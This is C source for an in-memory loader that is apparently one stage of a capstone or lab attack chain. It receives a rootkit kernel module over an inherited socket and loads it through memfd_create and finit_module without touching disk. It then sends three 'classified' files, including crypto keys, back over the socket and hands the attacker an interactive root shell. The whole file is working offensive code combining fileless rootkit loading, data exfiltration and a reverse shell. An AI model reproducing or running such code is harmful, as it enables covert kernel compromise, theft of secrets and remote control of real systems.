/* loader.c - reflective rootkit loader + PIR exfiltration
 *
 * Runs in-memory, delivered by exploit_privesc via fexecve. CHAIN_FD (fd 3)
 * is the open socket inherited from stager — nothing touches disk.
 *
 * Reads rootkit.ko from CHAIN_FD via delivery frame, loads it into the
 * kernel via memfd + finit_module, then reads the three PIR files and
 * sends them back over CHAIN_FD with the same delivery framing.
 */

#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define DELIVERY_MAGIC  0xDEADB17D
#define CHAIN_FD        3

static int memfd_create_s(const char *name, unsigned int flags)
{
	return (int)syscall(__NR_memfd_create, name, flags);
}

static int finit_module_s(int fd, const char *params, int flags)
{
	return (int)syscall(__NR_finit_module, fd, params, flags);
}

static int read_exact(int fd, void *buf, size_t n)
{
	char *p = buf;
	while (n > 0) {
		ssize_t r = read(fd, p, n);
		if (r <= 0) return -1;
		p += r; n -= (size_t)r;
	}
	return 0;
}

static int write_exact(int fd, const void *buf, size_t n)
{
	const char *p = buf;
	while (n > 0) {
		ssize_t w = write(fd, p, n);
		if (w <= 0) return -1;
		p += w; n -= (size_t)w;
	}
	return 0;
}

static void send_frame(int fd, const void *data, uint32_t size)
{
	struct { uint32_t magic; uint32_t size; } hdr = { DELIVERY_MAGIC, size };
	write_exact(fd, &hdr, sizeof(hdr));
	if (size) write_exact(fd, data, size);
}

/*
static int load_ko_from_path(const char *path)
{
	int f = open(path, O_RDONLY);
	if (f < 0) return -1;
	struct stat st;
	if (fstat(f, &st) < 0) { close(f); return -1; }
	void *buf = mmap(0, (size_t)st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
	close(f);
	if (buf == MAP_FAILED) return -1;

	int mfd = memfd_create_s("", 0);
	if (mfd < 0) { munmap(buf, (size_t)st.st_size); return -1; }
	if (write_exact(mfd, buf, (size_t)st.st_size) < 0) {
		munmap(buf, (size_t)st.st_size);
		close(mfd);
		return -1;
	}
	munmap(buf, (size_t)st.st_size);

	if (finit_module_s(mfd, "", 0) < 0) { close(mfd); return -1; }
	close(mfd);
	return 0;
}

#define DEFAULT_KO_PATH "/mnt/shared/capstone/rootkit.ko"
*/

int main(void)
{
	/* read rootkit.ko frame from chain socket */
	struct { uint32_t magic; uint32_t size; } hdr;
	if (read_exact(CHAIN_FD, &hdr, sizeof(hdr)) < 0) return 1;
	if (hdr.magic != DELIVERY_MAGIC) return 1;

	char *ko = malloc(hdr.size);
	if (!ko) return 1;
	if (read_exact(CHAIN_FD, ko, hdr.size) < 0) return 1;

	/* load rootkit into kernel via memfd — never written to disk */
	int mfd = memfd_create_s("", 0);
	if (mfd < 0) return 1;
	if (write_exact(mfd, ko, hdr.size) < 0) return 1;
	free(ko);

	if (finit_module_s(mfd, "", 0) < 0) return 1;
	close(mfd);

	/* exfil PIR ckfiles back over the chain soet */
	const char *pirs[] = {
		"/home/director/classified/agents.txt",
		"/home/director/classified/operation_blackbird.txt",
		"/home/director/classified/crypto_keys.txt",
		NULL
	};

	for (int i = 0; pirs[i]; i++) {
		int f = open(pirs[i], O_RDONLY);
		if (f < 0) {
			send_frame(CHAIN_FD, "(not found)", 11);
			continue;
		}
		struct stat st;
		fstat(f, &st);
		void *buf = mmap(0, (size_t)st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
		close(f);
		if (buf == MAP_FAILED) {
			send_frame(CHAIN_FD, "(mmap failed)", 13);
			continue;
		}
		send_frame(CHAIN_FD, buf, (uint32_t)st.st_size);
		munmap(buf, (size_t)st.st_size);
	}

	/* size=0 signals end of exfil */
	send_frame(CHAIN_FD, NULL, 0);

	/* drop root shell over the chain socket without any new connection*/
	dup2(CHAIN_FD, 0);
	dup2(CHAIN_FD, 1);
	dup2(CHAIN_FD, 2);
	close(CHAIN_FD);
	char *sh_argv[] = { "/bin/sh", "-i", NULL };
	char *sh_envp[] = {
		"TERM=xterm",
		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
		NULL
	};
	execve("/bin/sh", sh_argv, sh_envp);
	return 1;
}
